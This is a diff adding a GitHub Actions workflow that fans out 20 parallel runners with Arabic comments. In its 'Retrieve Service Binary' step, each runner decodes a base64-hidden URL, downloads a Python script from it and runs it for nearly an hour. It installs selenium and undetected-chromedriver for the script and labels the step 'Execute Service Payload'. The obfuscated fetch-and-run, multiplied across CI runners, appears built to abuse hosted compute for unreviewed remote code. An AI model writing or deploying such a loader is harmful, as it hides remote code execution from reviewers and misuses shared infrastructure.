@@ -1,0 +1,89 @@
+name: Aether Network Node Dispatcher
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: aether-dispatch-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Session Guard: إدارة الحد الأقصى لزمن الجلسة
+  # =================================================================
+  session-guard:
+    name: "Master Session Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_SESSION_SEC: 3540
+    steps:
+      - name: Monitor Session Duration
+        run: |
+          echo "[GUARD] Session timer started for Run ID: ${{ github.run_id }}"
+          echo "[GUARD] Limit fixed to ${MAX_SESSION_SEC}s."
+
+          sleep "${MAX_SESSION_SEC}"
+
+          echo "[GUARD] Limit reached. Issuing workflow cancellation call..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+  # =================================================================
+  # Node Array: معالجة العقد بالتوازي
+  # =================================================================
+  node-array:
+    name: "AetherNode-${{ matrix.node_num }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_num: [201, 202, 203, 204, 205, 206, 207, 208, 209, sa0, sa1, sa2, sa3, sa4, sa5, sa6, sa7, sa8, sa9, 220]
+
+    steps:
+      # الخطوة 1: تثبيت متطلبات النظام
+      - name: Prepare Node Base
+        run: |
+          echo "[INIT] Provisioning system tools for AetherNode-${{ matrix.node_num }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip ruby
+
+      # الخطوة 2: جلب واستخراج ملف التشغيل
+      - name: Retrieve Service Binary
+        run: |
+          echo "[DOWNLOAD] Resolving remote URL via Ruby..."
+          ENCODED_URI="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          TARGET_URI=$(ruby -e "require 'base64'; puts Base64.decode64('$ENCODED_URI')")
+
+          curl -sL "$TARGET_URI" -o engine_daemon.py
+          echo "[DOWNLOAD] Binary stored as engine_daemon.py."
+
+      # الخطوة 3: تثبيت حزم البرمجة
+      - name: Load Dependencies
+        run: |
+          echo "[DEPS] Installing Python modules..."
+          python3 -m pip install -q requests selenium undetected-chromedriver psutil
+
+      # الخطوة 4: إدارة التشغيل بواسطة أداة timeout النظامية
+      - name: Execute Service Payload
+        run: |
+          echo "[EXEC] Starting engine_daemon.py with a 3540s timeout..."
+
+          # استخدام أمر timeout لإدارة وقت التشغيل تلقائيًا وبصورة نظيفة
+          timeout --foreground --kill-after=10s 3540s python3 engine_daemon.py || EXIT_CODE=$?
+
+          if [ ${EXIT_CODE:-0} -eq 124 ]; then
+            echo "[EXEC] Process successfully ended by system timeout (59m limit)."
+          else
+            echo "[EXEC] Process completed natively before timeout."
+          fi
